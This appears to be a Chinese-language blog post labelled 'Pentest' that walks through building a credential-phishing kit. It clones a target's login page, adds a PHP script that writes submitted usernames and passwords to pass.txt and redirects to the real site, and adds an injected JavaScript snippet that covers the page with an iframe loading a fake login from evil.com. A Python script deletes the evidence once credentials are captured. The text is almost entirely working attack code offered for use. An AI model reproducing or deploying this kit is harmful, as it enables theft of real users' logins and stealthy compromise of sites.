Title: How To Fishing
Category: Pentest
Date: 2017-4-1
slug: how-to-fishing

<https://bbs.ichunqiu.com/thread-17965-1-1.html>

准备材料：

```
目标登录页面: login.html
假的登录页面: fake.html
世界上最好的语言: deal.php
fish.js
```


步骤:

* 先下载目标login.html，保存为fake.html
wget -r -p -np -k 网站地址

然后替换掉登录时候的POST目标地址，比如`<form action="http://normal.com/login.php" method="post">`，替换掉自己的deal.php页面。

注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html

* 然后再服务器上构造一个deal.php

```
<?php
$user = $_POST['username'];
$pass = $_POST['password'];
$f = fopen('pass.txt','a');
fwrite($f, "User:".$user."Pass:".$pass."\n");
fclose($f);
header("Location: http://normal.com/manage"); //跳转到正常的后台
?>
```
* 还差一个js

```
 document.body.innerHTML='<div style="position:absolute;top:0px;left:0px;width:100%;height:100%">'+
'<iframe frameborder="no" scrolling="no" border="no" src=http://evil.com/fake.html width=100% height=100%>' +
'</iframe></div>'
```

当fish.js插入到后台的时候，会覆盖掉当前页面，然后受害者输入用户密码，就可以在服务器上收到用户密码。


这里存在一个问题，如果受害者的页面不停刷新，会一致执行js，一直出现fake登录页面，所以可以在服务区上执行一个python脚本，监听pass.txt文件是否是空，不是空就退出，同时删除掉fish.js和fake.html

```
#!/usr/bin/env python
# coding: utf-8

import sys
import os
import datetime

while 1:
	if os.path.getsize('pass.txt') == 0:
		print datetime.datetime.now()
	else:
		os.system("rm -rf fish.js")
		os.system("rm -rf fake.html")
		sys.exit(0)
```

至此构造完成，当python脚本退出的时候，密码就记录到了pass.txt文件
